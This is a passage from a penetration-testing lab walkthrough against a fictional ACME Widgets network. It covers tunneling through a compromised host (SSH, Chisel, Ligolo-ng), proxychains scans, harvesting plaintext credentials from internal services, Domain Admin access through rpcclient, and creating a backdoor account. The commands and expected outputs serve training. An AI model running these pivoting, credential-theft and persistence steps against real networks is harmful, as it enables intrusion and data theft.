8000\n- `--reverse` = allow clients to create reverse tunnels (the client tells the server what to forward)\n\n**Expected output:**\n```\nserver: Listening on http://0.0.0.0:8000\n```\n\n#### Step 2: Upload Chisel to the Compromised Host\n\nYou need to get the chisel binary onto the webserver. Since you have SSH access:\n\n```bash\n# Find where chisel is on your Kali machine\nwhich chisel\n# Usually at /usr/bin/chisel\n\n# Copy it to the webserver\nscp /usr/bin/chisel svc_backup@172.16.0.100:/tmp/chisel\n```\n\nPassword: `Backup2024`\n\n#### Step 3: Run the Chisel Client on the Webserver\n\nSSH into the webserver and run chisel:\n\n```bash\nssh svc_backup@172.16.0.100\n```\n\nThen on the webserver:\n\n```bash\n/tmp/chisel client 172.16.0.10:8000 R:socks\n```\n\n**What this does:**\n- `client` = run in client mode\n- `172.16.0.10:8000` = connect to the chisel server on our Kali machine\n- `R:socks` = create a reverse SOCKS proxy. This opens a SOCKS proxy on the Kali server (default port 1080) that routes traffic through the webserver.\n\n**Expected output on the server side:**\n```\nserver: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening\n```\n\n#### Step 4: Use the Chisel Proxy\n\nThe SOCKS proxy is now available at `localhost:1080` on your Kali machine. Configure proxychains to use port 1080 instead of 9050 (see Phase 5).\n\n**Advantages of Chisel over SSH:**\n- Single binary, easy to upload\n- Faster than SSH for proxying\n- Does not require SSH access (just needs network connectivity)\n- Can tunnel through HTTP proxies (useful for restricted environments)\n\n---\n\n### Pivot Option 3: Ligolo-ng (Advanced)\n\nLigolo-ng creates a virtual network interface on your Kali machine that routes directly into the remote network. It is the most seamless option -- once set up, you can use tools normally without proxychains.\n\n**How it works:** Instead of a SOCKS proxy, Ligolo-ng creates a TUN interface (like a VPN). Your operating system routes traffic for the remote subnet through this interface, and Ligolo-ng tunnels it through the compromised host. Tools do not need special proxy configuration.\n\n#### Step 1: Start the Ligolo-ng Proxy on Kali\n\n```bash\nsudo ligolo-proxy -selfcert\n```\n\n**What the flags mean:**\n- `-selfcert` = generate a self-signed TLS certificate (for encrypted tunneling)\n\n**Expected output:**\n```\nINFO[0000] Listening on 0.0.0.0:11601\n```\n\n#### Step 2: Upload and Run the Agent on the Webserver\n\nCopy the agent binary:\n\n```bash\nscp /usr/bin/ligolo-agent svc_backup@172.16.0.100:/tmp/ligolo-agent\n```\n\nSSH in and run it:\n\n```bash\nssh svc_backup@172.16.0.100\n/tmp/ligolo-agent -connect 172.16.0.10:11601 -ignore-cert\n```\n\n**What the flags mean:**\n- `-connect 172.16.0.10:11601` = connect back to the Ligolo-ng proxy on Kali\n- `-ignore-cert` = accept the self-signed certificate\n\n**Expected output:**\n```\nINFO[0000] Connection established  addr=\"172.16.0.10:11601\"\n```\n\n#### Step 3: Configure the Tunnel in Ligolo-ng\n\nBack in the Ligolo-ng proxy console on Kali, you should see the agent connection:\n\n```\nligolo-ng >> session\n```\n\nSelect the session (usually session #1). Then view the agent's network interfaces:\n\n```\n[Agent : svc_backup@webserver] >> ifconfig\n```\n\nYou should see `172.16.1.10/24` -- that is the DMZ network.\n\nStart the tunnel:\n\n```\n[Agent : svc_backup@webserver] >> start\n```\n\n#### Step 4: Add Routes on Kali\n\nOpen a new terminal and add a route so your OS knows to send DMZ traffic through Ligolo:\n\n```bash\nsudo ip route add 172.16.1.0/24 dev ligolo\n```\n\nNow you can directly access DMZ hosts without proxychains:\n\n```bash\n# These work directly -- no proxychains needed!\nnmap -sV 172.16.1.10 -p 22,80\ncurl http://172.16.1.20\n```\n\n**To reach the internal network**, you would need a second agent on a host that can access 172.16.2.0/24 (like the jumpbox), and add another route:\n\n```bash\nsudo ip route add 172.16.2.0/24 dev ligolo\n```\n\n**Advantages of Ligolo-ng:**\n- No proxychains needed -- tools work natively\n- Supports ICMP (ping works through the tunnel)\n- Very fast and reliable\n- Clean interface for managing multiple tunnels\n\n**Disadvantages:**\n- More complex setup\n- Requires root on Kali (for the TUN interface)\n- Larger binary to upload\n\n### What We Learned\n\n- SSH tunneling is the simplest option when you have SSH credentials\n- Chisel is a great middle ground -- single binary, fast, reverse SOCKS proxy\n- Ligolo-ng is the most powerful -- creates a virtual network interface\n- All three achieve the same goal: routing your traffic through the compromised host\n\n### Stuck?\n\n- If SSH tunnel fails, verify you can SSH normally first: `ssh svc_backup@172.16.0.100`\n- If chisel client cannot connect, check that port 8000 is not blocked and the server is running\n- For Ligolo-ng, make sure you run the proxy with `sudo`\n- Remember: the SOCKS proxy port matters for proxychains configuration (9050 for SSH, 1080 for Chisel)\n\n---\n\n## Phase 5: Proxychains Deep-Dive\n\n### Educational Introduction -- What is Proxychains?\n\nProxychains is a tool that forces any application to route its traffic through a proxy (like the SOCKS proxy we just created). This lets you use normal tools (nmap, curl, smbclient) as if your Kali machine were directly connected to the remote network.\n\n**Analogy:** Think of proxychains as a mail forwarding service. Instead of sending your letters directly (which would get blocked by the firewall), you give them to a trusted insider (your pivot host) who forwards them for you. The recipient sees the letter coming from the insider, not from you.\n\n### Objective\n\nConfigure proxychains and learn to scan and access services through your pivot.\n\n### Step 1: Configure Proxychains\n\nEdit the proxychains configuration file:\n\n```bash\nsudo nano /etc/proxychains4.conf\n```\n\nScroll to the bottom of the file. You will see a `[ProxyList]` section. Make sure it contains:\n\n**If using SSH tunnel (port 9050):**\n```\n[ProxyList]\nsocks5 127.0.0.1 9050\n```\n\n**If using Chisel (port 1080):**\n```\n[ProxyList]\nsocks5 127.0.0.1 1080\n```\n\nAlso, near the top of the file, make sure you have:\n```\nquiet_mode\n```\n\nThis suppresses the verbose proxy messages that clutter your output. If the line has a `#` in front of it, remove the `#` to uncomment it.\n\nSave and exit (Ctrl+X, then Y, then Enter).\n\n### Step 2: Test Proxychains\n\n```bash\nproxychains curl -s http://172.16.1.10\n```\n\n**What this does:** Forces curl to send its HTTP request through the SOCKS proxy, which routes it through the webserver. The webserver then makes the request to `172.16.1.10` (itself, in this case).\n\n**Expected output:** The HTML of the WordPress site.\n\n### Step 3: Scan the Internal Network Through the Proxy\n\n**Important:** Proxychains only works with **TCP** connections. This means:\n- You MUST use `-sT` (TCP connect scan) with nmap, not the default `-sS` (SYN scan)\n- You MUST use `-Pn` (skip host discovery) because ICMP pings do not work through SOCKS\n- UDP scans will NOT work through proxychains\n\n**Scan for live internal hosts:**\n\n```bash\nproxychains nmap -sT -Pn 172.16.2.0/24 -p 22,80,445,389,3306 --open\n```\n\n**What the flags mean:**\n- `-sT` = TCP connect scan (required for proxychains)\n- `-Pn` = Do not ping first, just scan (required for proxychains)\n- `-p 22,80,445,389,3306` = Only scan these specific ports (SSH, HTTP, SMB, LDAP, MySQL)\n- `--open` = Only show ports that are open\n\n**Note:** This scan will be slow because every connection goes through the proxy. Be patient. You can scan specific hosts to be faster.\n\n**Expected output:**\n```\nNmap scan report for 172.16.2.10\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n\nNmap scan report for 172.16.2.12\nPORT    STATE SERVICE\n22/tcp  open  ssh\n389/tcp open  ldap\n445/tcp open  microsoft-ds\n\nNmap scan report for 172.16.2.20\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap scan report for 172.16.2.30\nPORT   STATE SERVICE\n80/tcp open  http\n\nNmap scan report for 172.16.2.40\nPORT     STATE SERVICE\n3306/tcp open  mysql\n```\n\n**Internal hosts and services found:**\n| IP | Open Ports | Service |\n|----|------------|----------|\n| 172.16.2.10 | 445 | File server (SMB) |\n| 172.16.2.11 | -- | Workstation (may be filtered) |\n| 172.16.2.12 | 22, 389, 445 | Domain controller (SSH, LDAP, SMB) |\n| 172.16.2.20 | 80 | Wiki (HTTP) |\n| 172.16.2.30 | 80 | Ticketing system (HTTP) |\n| 172.16.2.40 | 3306 | Database (MySQL) |\n\n### Step 4: Access Services Through Proxychains\n\nHere are examples of accessing different services through the proxy:\n\n**Web services (curl):**\n```bash\nproxychains curl -s http://172.16.2.20\nproxychains curl -s http://172.16.2.30\n```\n\n**SMB (smbclient):**\n```bash\nproxychains smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'\n```\n\n**MySQL:**\n```bash\nproxychains mysql -h 172.16.2.40 -u root -pDBr00t2024!\n```\n\n**SSH:**\n```bash\nproxychains ssh admin@172.16.1.20\n```\n\n### Step 5: Using a Browser Through Proxychains\n\nYou can also route Firefox through the proxy:\n\n```bash\nproxychains firefox &\n```\n\nThen navigate to `http://172.16.2.20` or `http://172.16.2.30` in the browser.\n\nAlternatively, configure Firefox's built-in proxy settings:\n1. Open Firefox Settings\n2. Search for \"proxy\"\n3. Click \"Settings...\"\n4. Select \"Manual proxy configuration\"\n5. Set SOCKS Host: `127.0.0.1`, Port: `9050` (or 1080 for Chisel)\n6. Select SOCKS v5\n\n### What We Learned\n\n- Proxychains routes TCP traffic through SOCKS proxies\n- It only works with TCP (use `-sT` with nmap, no UDP)\n- Always use `-Pn` with nmap through proxychains\n- Scans are slower but give us full access to the internal network\n\n### Stuck?\n\n- If proxychains says \"connection refused,\" verify your tunnel is still running: `ss -tlnp | grep 9050`\n- If nmap hangs, try scanning fewer ports on fewer hosts\n- If you see \"timeout,\" the firewall might be blocking that traffic. Not all paths are open.\n- Make sure you edited the right file: `/etc/proxychains4.conf` (note the `4`)\n\n---\n\n## Phase 6: Internal Network Enumeration\n\n### Educational Introduction -- What is Internal Enumeration?\n\nOnce inside a network, attackers methodically explore every system looking for credentials, sensitive data, and paths to higher privileges. This is called enumeration.\n\n**Why it works:** Organizations often focus their security on the perimeter (firewalls, external monitoring) but leave internal systems poorly secured. Internal wikis have passwords in plain text. Ticketing systems contain credentials in ticket comments. Databases have weak passwords. File shares have sensitive documents accessible to everyone.\n\n**How to defend against it:** Encrypt sensitive data, use secrets managers (like HashiCorp Vault), implement proper access controls, and audit who accesses what.\n\n### Objective\n\nExplore every internal service to gather credentials and intelligence that will lead us to Domain Admin access.\n\n---\n\n### Target 1: Internal Wiki (172.16.2.20)\n\nThe wiki is a static HTML site served by nginx. It contains IT documentation -- the kind that should never be on an unauthenticated internal wiki.\n\n**Browse the home page:**\n\n```bash\nproxychains curl -s http://172.16.2.20/\n```\n\n**Expected output (abbreviated):**\n```html\n<h1>ACME Widgets Internal Wiki</h1>\n<h2>Quick Links</h2>\n<ul>\n  <li><a href=\"/it/network.html\">Network Documentation</a></li>\n  <li><a href=\"/it/services.html\">Service Accounts</a></li>\n  <li><a href=\"/it/procedures.html\">IT Procedures</a></li>\n</ul>\n```\n\nThree links. Let us check every one.\n\n**Network Documentation:**\n\n```bash\nproxychains curl -s http://172.16.2.20/it/network.html\n```\n\nThis page contains the complete network diagram with every hostname, IP address, and port. This is an intelligence goldmine -- it tells us exactly what to attack.\n\n**Service Accounts (THE JACKPOT):**\n\n```bash\nproxychains curl -s http://172.16.2.20/it/services.html\n```\n\n**Expected critical findings:**\n```\nEmergency Access - BREAK GLASS ONLY\n\nDomain Admin (Break Glass):\n  Username: Administrator\n  Password: Adm1n2024\n\nDatabase Root:\n  Server: db01 (172.16.2.40)\n  Username: root\n  Password: DBr00t2024!\n\nJenkins Admin:\n  URL: http://jenkins.dmz.acmewidgets.local:8080\n  Username: admin\n  Password: admin\n  Note: CHANGE THIS!\n```\n\nThe wiki has **Domain Admin credentials** in plain text. The IT department left their \"break glass\" emergency passwords on an unauthenticated wiki page. This is unfortunately very common in real organizations.\n\n**IT Procedures:**\n\n```bash\nproxychains curl -s http://172.16.2.20/it/procedures.html\n```\n\n**Expected critical findings:**\n```\nBackup Procedures:\n  Credentials (stored in script)\n  Username: svc_backup\n  Password: Backup2024\n```\n\nThe procedures page confirms the svc_backup credentials and reveals they are hardcoded into backup scripts.\n\n---\n\n### Target 2: Ticketing System (172.16.2.30)\n\nThe ticketing system is a PHP application that shows IT support tickets. Tickets often contain sensitive information because employees include passwords and system details in their requests.\n\n```bash\nproxychains curl -s http://172.16.2.30/\n```\n\n**Expected output (summarized tickets):**\n\n| Ticket | Subject | Sensitive Info Found |\n|--------|---------|---------------------|\n| TKT-001 | VPN Access Request | jsmith's VPN credentials set to `VPN2024!` |\n| TKT-002 | Password Reset - svc_backup | Password reset to `Backup2024` |\n| TKT-003 | Jenkins Deployment Failing | Jenkins temporarily using svc_backup credentials for SMB |\n| TKT-004 | New Employee Setup - Mary Williams | mwilliams initial password: `Welcome123` |\n| TKT-005 | Database Backup Failed | MySQL root password: `DBr00t2024!` |\n| TKT-006 | Security Audit Findings | Lists all weaknesses: default Jenkins password, anonymous FTP, wiki has plaintext passwords |\n\nEvery single ticket leaks sensitive information. TKT-006 is especially ironic -- it documents the security audit findings, but the remediation is \"planned for Q2\" (meaning nobody fixed anything).\n\n---\n\n### Target 3: MySQL Database (172.16.2.40)\n\nThe database server runs MariaDB (a MySQL-compatible database). We have the root password from both the wiki and the ticketing system.\n\n```bash\nproxychains mysql -h 172.16.2.40 -u root -pDBr00t2024!\n```\n\n**What the flags mean:**\n- `-h 172.16.2.40` = connect to this host\n- `-u root` = log in as the root (admin) user\n- `-pDBr00t2024!` = the password (no space between `-p` and the password)\n\n**Expected output:**\n```\nWelcome to the MariaDB monitor.\nMariaDB [(none)]>\n```\n\nYou are connected. Now explore:\n\n```sql\nSHOW DATABASES;\n```\n\n**Expected output:**\n```\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| internal_data      |\n| mysql              |\n+--------------------+\n```\n\n```sql\nUSE internal_data;\nSHOW TABLES;\n```\n\n**Expected output:**\n```\n+-------------------------+\n| Tables_in_internal_data |\n+-------------------------+\n| employee_credentials    |\n| servers                 |\n+-------------------------+\n```\n\n```sql\nSELECT * FROM employee_credentials;\n```\n\n**Expected output:**\n```\n+----+-----------+----------+--------------+\n| id | username  | password | department   |\n+----+-----------+----------+--------------+\n| 1  | jsmith    | Summer2024   | IT       |\n| 2  | mwilliams | Welcome123   | HR       |\n| 3  | svc_backup| Backup2024   | Service  |\n+----+-----------+----------+--------------+\n```\n\n```sql\nSELECT * FROM servers;\n```\n\nThis table contains server inventory information, potentially including admin credentials and IP addresses.\n\nType `exit` or `quit` to leave MySQL.\n\n---\n\n### Target 4: FTP Server (172.16.1.30 -- DMZ)\n\nThe FTP server is in the DMZ. You can reach it through your pivot.\n\n**Anonymous access (no credentials needed):**\n\n```bash\nproxychains ftp 172.16.1.30\n```\n\nWhen prompted for a username, type `anonymous` and press Enter. For the password, just press Enter (or type anything).\n\n```\nftp> ls\n```\n\n**Expected output:**\n```\n-rw-r--r--    1 0     0       1234 Jan 15 10:00 welcome.txt\ndrw-r--r--    2 0     0       4096 Jan 15 10:00 public\n```\n\n```\nftp> cd public\nftp> ls\n-rw-r--r--    1 0     0       2048 Jan 15 10:00 network-diagram.txt\n-rw-r--r--    1 0     0        512 Jan 15 10:00 welcome.txt\nftp> get network-diagram.txt\nftp> bye\n```\n\nRead the downloaded file:\n\n```bash\ncat network-diagram.txt\n```\n\nThis file contains the network diagram, which is helpful if you have not found the wiki yet.\n\n**Authenticated access with svc_backup:**\n\n```bash\nproxychains ftp 172.16.1.30\n```\n\nUsername: `svc_backup`\nPassword: `Backup2024`\n\n```\nftp> ls\nftp> cd backups\nftp> ls\n-rw-r--r--    1 0     0       1024 Jan 10 02:00 old-passwords.txt\nftp> get old-passwords.txt\nftp> bye\n```\n\n```bash\ncat old-passwords.txt\n```\n\nThis file contains old passwords that may still work on some systems.\n\n---\n\n### Target 5: File Server (172.16.2.10)\n\nThe file server hosts SMB (Windows-style file sharing) shares.\n\n**List available shares:**\n\n```bash\nproxychains smbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'\n```\n\n**Expected output:**\n```\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tpublic          Disk      Public files\n\tsensitive       Disk      Restricted access\n\tbackups         Disk      Backup files\n\tIPC$            IPC       IPC Service\n```\n\n**Access the sensitive share:**\n\n```bash\nproxychains smbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024'\n```\n\n```\nsmb: \\> ls\n  .                D        0  Sun Jan 14 10:00:00 2024\n  ..               D        0  Sun Jan 14 10:00:00 2024\n  passwords.txt    A      256  Sun Jan 14 10:00:00 2024\n\nsmb: \\> get passwords.txt\nsmb: \\> exit\n```\n\n```bash\ncat passwords.txt\n```\n\n**Expected output:**\n```\n=== ACME INTERNAL PASSWORD LIST ===\nDO NOT SHARE OUTSIDE IT DEPARTMENT\n\nServer Room Door: 4521\nWiFi Password: AcmeGuest2024\nVPN PSK: AcmeVPN2024\nBackup Encryption: BackupKey2024!\n\nDomain Admin (emergency): Adm1n2024\n```\n\nAnother source confirming the Domain Admin password: `Adm1n2024`\n\n---\n\n### Enumeration Summary\n\nHere is everything we found across all internal services:\n\n| Source | What We Found |\n|--------|---------------|\n| Wiki - services.html | Domain Admin: Administrator / Adm1n2024 |\n| Wiki - services.html | MySQL root: root / DBr00t2024! |\n| Wiki - services.html | Jenkins admin: admin / admin |\n| Wiki - procedures.html | svc_backup / Backup2024 (confirmed) |\n| Ticketing TKT-001 | jsmith VPN password: VPN2024! |\n| Ticketing TKT-004 | mwilliams initial password: Welcome123 |\n| Ticketing TKT-005 | MySQL root: DBr00t2024! (confirmed) |\n| MySQL database | Employee credentials table |\n| File server | passwords.txt with Domain Admin password |\n| FTP (svc_backup) | old-passwords.txt with historical credentials |\n\n### What We Learned\n\n- Internal systems are often poorly secured because organizations assume the perimeter will hold\n- Credentials appear in multiple places -- wikis, tickets, databases, file shares\n- A single compromised service account (svc_backup) gave us access to many systems\n- We now have Domain Admin credentials from at least two independent sources\n\n### Stuck?\n\n- If proxychains curl hangs, your tunnel may have dropped. Re-establish it (see Phase 4)\n- If SMB authentication fails, check for typos in the password. The format is `-U 'username%password'`\n- If MySQL connection is refused, the firewall may only allow the webserver to reach db01. Try the MySQL connection from an SSH session on the webserver instead.\n\n---\n\n## Phase 7: Domain Compromise\n\n### Educational Introduction -- What is Active Directory?\n\nActive Directory (AD) is the system that most organizations use to manage user accounts, computers, and permissions across their network.\n\n**What it is in plain English:** Think of Active Directory like the master directory for a large company. It knows who every employee is, what their password is, which groups they belong to, and what they are allowed to access. The Domain Controller (DC) is the server that runs this directory.\n\n**Why it matters for attackers:** If you control the Domain Controller, you control EVERYTHING in the network. You can:\n- Log in as any user\n- Access any file on any computer\n- Read anyone's email\n- Install software on any machine\n- Create new admin accounts\n\n**What is a Domain Admin?** It is the highest privilege level in Active Directory. A Domain Admin account can do anything on any computer in the domain. Getting Domain Admin access is the primary goal of most penetration tests.\n\n**How to defend Active Directory:**\n- **Use a tiered admin model** -- separate admin accounts for different privilege levels\n- **Never put Domain Admin credentials on wikis or file shares**\n- **Enable multi-factor authentication (MFA)** for all admin accounts\n- **Monitor for suspicious authentication** -- logins from unusual IPs, at unusual times\n- **Regular password rotation** for privileged accounts\n\n**Note about this lab:** This lab uses **Samba AD**, a Linux implementation of Active Directory. The concepts and many of the commands are identical to those used against real Windows Active Directory.\n\n### Objective\n\nAuthenticate as Domain Administrator to the domain controller and demonstrate full domain control.\n\n### Step 1: Verify Domain Admin Credentials\n\nWe found `Administrator / Adm1n2024` from multiple sources. Let us verify it works.\n\n**Test via SMB:**\n\n```bash\nproxychains smbclient -L //172.16.2.12 -U 'Administrator%Adm1n2024'\n```\n\n**Expected output:**\n```\n\tSharename       Type      Comment\n\t---------       ----      -------\n\tnetlogon        Disk\n\tsysvol          Disk\n\tIPC$            IPC       IPC Service\n```\n\nSeeing `sysvol` and `netlogon` shares confirms this is a Domain Controller and we have valid Domain Admin credentials. These shares are only available on DCs.\n\n**Test via RPC:**\n\n```bash\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getusername'\n```\n\n**Expected output:**\n```\nAccount Name: Administrator, Authority Name: ACMEWIDGETS\n```\n\nConfirmed. We are authenticated as the Administrator in the ACMEWIDGETS domain.\n\n### Step 2: Enumerate Domain Users\n\n```bash\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers'\n```\n\n**What `rpcclient` is:** A tool for executing Microsoft Remote Procedure Call (RPC) functions. It can query Active Directory for users, groups, policies, and more.\n\n**Expected output:**\n```\nuser:[Administrator] rid:[0x1f4]\nuser:[krbtgt] rid:[0x1f6]\nuser:[jsmith] rid:[0x3e9]\nuser:[mwilliams] rid:[0x3ea]\nuser:[svc_backup] rid:[0x3eb]\n```\n\n**What the RID means:** RID (Relative Identifier) is a unique number for each account. `0x1f4` (500 in decimal) is always the built-in Administrator account.\n\n### Step 3: Enumerate Domain Groups\n\n```bash\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomgroups'\n```\n\n**Expected output:**\n```\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\n...\n```\n\n### Step 4: Check Domain Admins Membership\n\n```bash\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'querygroupmem 0x200'\n```\n\n**What `0x200` means:** That is the RID for the Domain Admins group (512 in decimal).\n\n**Expected output:**\n```\nrid:[0x1f4] attr:[0x7]\n```\n\nThis shows that only the Administrator account (RID 0x1f4 = 500) is in the Domain Admins group.\n\n### Step 5: Query Individual Users\n\n```bash\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'queryuser svc_backup'\n```\n\n**Expected output:**\n```\n\tUser Name   :\tsvc_backup\n\tFull Name   :\tBackup Service Account\n\tDescription :\tBackup service account\n\tComment     :\t\n\tUser RID    :\t0x3eb\n\tGroup RID   :\t0x201\n```\n\n### Step 6: Check Password Policy\n\n```bash\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'getdompwinfo'\n```\n\n**Expected output:**\n```\nmin_password_length: 7\npassword_properties: 0x00000000\n```\n\nA `password_properties` of `0x00000000` means no complexity requirements are enforced. Combined with a minimum length of only 7 characters, this means the password policy is very weak.\n\n### Step 7: Access Protected Shares\n\nProve full domain control by accessing SYSVOL:\n\n```bash\nproxychains smbclient //172.16.2.12/sysvol -U 'Administrator%Adm1n2024' -c 'ls'\n```\n\n**Expected output:**\n```\n  .                       D        0  ...\n  ..                      D        0  ...\n  acmewidgets.local       D        0  ...\n```\n\nAccessing SYSVOL confirms Domain Admin level access.\n\n### Step 8: Create a Backdoor Account (Persistence)\n\nA common post-exploitation step is creating a hidden admin account:\n\n```bash\nproxychains net rpc user add support 'P@ssw0rd123!' -U 'Administrator%Adm1n2024' -S 172.16.2.12\n```\n\n**Expected output:**\n```\nAdded user 'support'.\n```\n\n**Verify it was created:**\n\n```bash\nproxychains rpcclient -U 'Administrator%Adm1n2024' 172.16.2.12 -c 'enumdomusers' | grep support\n```\n\n**Expected output:**\n```\nuser:[support] rid:[0x3ec]\n```\n\n**Test the new account:**\n\n```bash\nproxychains smbclient -L //172.16.2.12 -U 'support%P@ssw0rd123!'\n```\n\nYou should see the share listing, confirming the backdoor account works.\n\n### Step 9: LDAP Deep Dive\n\nLDAP (Lightweight Directory Access Protocol) provides the most detailed information about the domain.\n\n```bash\nproxychains ldapsearch -x -H ldap://172.16.2.12 \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'cn=Users,DC=acmewidgets,DC=local' \\\n  '(objectClass=user)' sAMAccountName description memberOf\n```\n\n**What the flags mean:**\n- `-x` = use simple authentication (instead of SASL)\n- `-H ldap://172.16.2.12` = connect to this LDAP server\n- `-D \"cn=Administrator,...\"` = bind (authenticate) as this user. The DN (Distinguished Name) is the LDAP way of specifying a user's full path in the directory.\n- `-w 'Adm1n2024'` = the password\n- `-b 'cn=Users,...'` = the search base -- where to start looking\n- `'(objectClass=user)'` = the search filter -- find all user objects\n- The last arguments are which attributes to return\n\n**Note:** If the LDAP server requires encrypted connections, you may need to add `-ZZ` for StartTLS and prefix the command with `LDAPTLS_REQCERT=never` to accept self-signed certificates:\n\n```bash\nLDAPTLS_REQCERT=never proxychains ldapsearch -x -H ldap://172.16.2.12 -ZZ \\\n  -D \"cn=Administrator,cn=Users,DC=acmewidgets,DC=local\" \\\n  -w 'Adm1n2024' \\\n  -b 'cn=Users,DC=acmewidgets,DC=local' \\\n  '(objectClass=user)' sAMAccountName description memberOf\n```\n\n### What We Learned\n\n- Domain Admin credentials from the wiki and file server are valid\n- The domain has weak password policies (no complexity, min length 7)\n- We can enumerate all users, groups, and their memberships\n- We created a persistent backdoor account\n- LDAP provides the most comprehensive domain information\n\n### Stuck?\n\n- If rpcclient fails with \"NT_STATUS_LOGON_FAILURE,\" double-check the password: `Adm1n2024`\n- If LDAP search returns nothing, try adjusting the search base to `DC=acmewidgets,DC=local`\n- If SMB connections time out, your proxy tunnel may have dropped. Re-establish it.\n- Remember to prefix all commands with `proxychains` when accessing internal hosts.\n\n---\n\n## Phase 8: Alternative Attack Paths\n\nOne of the most valuable skills in penetration testing is finding multiple ways to achieve the same goal. Here are the alternative paths through this lab.\n\n---\n\n### Alternative Path A: VPN Access (Fastest Path)\n\n**When to use this:** When you have credentials for a VPN, you can skip all the pivoting complexity and land directly on the internal network.\n\nFrom the SQL injection in Phase 2, we extracted `jsmith / Summer2024`. The ticketing system also reveals that jsmith has VPN access (TKT-001 set credentials to `VPN2024!`).\n\n#### Step 1: Get the VPN Configuration\n\nThe VPN server is at `172.16.0.50`. You would need an OpenVPN client configuration file. It may be available on the jumpbox at `/etc/openvpn/client.ovpn` (mentioned in the wiki's network documentation).\n\nIf you have the config file:\n\n```bash\nopenvpn --config client.ovpn --auth-user-pass\n```\n\nWhen prompted:\n- Username: `jsmith`\n- Password: `Summer2024`\n\n(Or try `vpnuser` / `VPN2024!`)\n\n#### Step 2: Verify Internal Access\n\nOnce the VPN connects, you will have a new network interface (typically `tun0`) with an IP in the VPN range. The VPN server at `172.16.2.50` is dual-homed (it is on both the internet and internal networks), so you should now be able to route directly to `172.16.2.0/24`.\n\n```bash\nip addr show tun0\nping 172.16.2.20\n```\n\nIf this works, you can skip directly to Phase 6 (Internal Enumeration) without any pivoting.\n\n**Why this matters for real-world testing:** VPN credentials are often the quickest way into a network. Organizations that do not enforce MFA on their VPN are at significant risk.\n\n---\n\n### Alternative Path B: Jumpbox Route\n\nThe jumpbox (172.16.1.20) is an SSH bastion host that has firewall rules allowing it to SSH to ANY internal host on port 22.\n\n#### Step 1: Access the Jumpbox\n\nYou need jumpbox credentials. Here are ways to find them:\n- The admin password `JumpB0x2024!` may be found in the wiki or ticketing system once you have internal access\n- The `svc_backup / Backup2024` credentials also work on the jumpbox\n\nFrom the DMZ (via your pivot or from the Jenkins/webserver shell):\n\n```bash\nproxychains ssh admin@172.16.1.20\n```\n\nPassword: `JumpB0x2024!`\n\nOr:\n\n```bash\nproxychains ssh svc_backup@172.16.1.20\n```\n\nPassword: `Backup2024`\n\n#### Step 2: Access Internal Hosts from the Jumpbox\n\nThe jumpbox can SSH directly to any internal host:\n\n```bash\n# From the jumpbox shell:\nssh svc_backup@172.16.2.10   # File server\n```\n\nThe admin account on the jumpbox has sudo privileges, making it a powerful pivot point.\n\n#### Step 3: Create a Second-Hop Tunnel\n\nYou can chain SSH tunnels:\n\n```bash\n# From Kali: tunnel to jumpbox through webserver\nssh -L 2222:172.16.1.20:22 -N -f svc_backup@172.16.0.100\n\n# Then: tunnel to internal network through jumpbox\nssh -D 9051 -N -f -p 2222 admin@localhost\n```\n\nNow you have a SOCKS proxy on port 9051 that routes through the jumpbox, which can reach any internal host via SSH.\n\n---\n\n### Alternative Path C: Jenkins to File Server (SMB)\n\nThe firewall allows Jenkins (172.16.1.40) to access the file server (172.16.2.10) on port 445 (SMB). If you have a shell on Jenkins:\n\n```bash\n# From your Jenkins reverse shell:\nsmbclient -L //172.16.2.10 -U 'svc_backup%Backup2024'\nsmbclient //172.16.2.10/sensitive -U 'svc_backup%Backup2024'\n```\n\nYou can get the `passwords.txt` file with the Domain Admin credentials directly from the Jenkins shell, without needing to pivot through the webserver.\n\n---\n\n### Alternative Path D: Chained Multi-Hop Pivots\n\nFor maximum depth and practice, chain pivots through multiple hosts:\n\n```\nKali --> Jenkins (reverse shell) --> Webserver (SSH) --> Jumpbox (SSH) --> Internal hosts\n```\n\n#### Hop 1: Kali to Jenkins\n\nUse the reverse shell from Phase 3.\n\n#### Hop 2: Jenkins to Webserver\n\nFrom the Jenkins shell:\n\n```bash\nssh -D 1080 svc_backup@172.16.1.10\n```\n\nThis creates a SOCKS proxy on the Jenkins machine. But we need that proxy accessible from Kali.\n\n#### Hop 3: Webserver to Jumpbox\n\nFrom the webserver shell:\n\n```bash\nssh admin@172.16.1.20\n# Password: JumpB0x2024!\n```\n\n#### Hop 4: Jumpbox to Internal\n\nFrom the jumpbox:\n\n```bash\nssh svc_backup@172.16.2.10\n```\n\nNow you are four hops deep: Kali -> Jenkins -> Webserver -> Jumpbox -> File Server.\n\nThis is how real APT groups operate -- many hops make it harder for defenders to trace the attack back to the original entry point.\n\n---\n\n### Alternative Path E: Database-First Approach\n\nIf you establish a pivot through the webserver early and find the MySQL credentials (from the wiki, ticketing, or even guessing common passwords), you can go straight to the database:\n\n```bash\nproxychains mysql -h 172.16.2.40 -u root -pDBr00t2024!\n```\n\n```sql\nUSE internal_data;\nSELECT * FROM employee_credentials;\nSELECT * FROM servers;\n```\n\nThe database may contain credentials that lead directly to Domain Admin access.\n\n---\n\n### Attack Path Comparison\n\n| Path | Steps to DA | Time Estimate | Skills Practiced |\n|------|------------|---------------|------------------|\n| SQLi -> SSH -> Pivot -> Wiki | 7-8 steps | 45-60 min | SQLi, SSH tunneling, proxychains, enumeration |\n| Jenkins RCE -> SMB -> passwords.txt | 4-5 steps | 30-45 min | Command injection, reverse shells, SMB |\n| SQLi -> VPN -> Direct 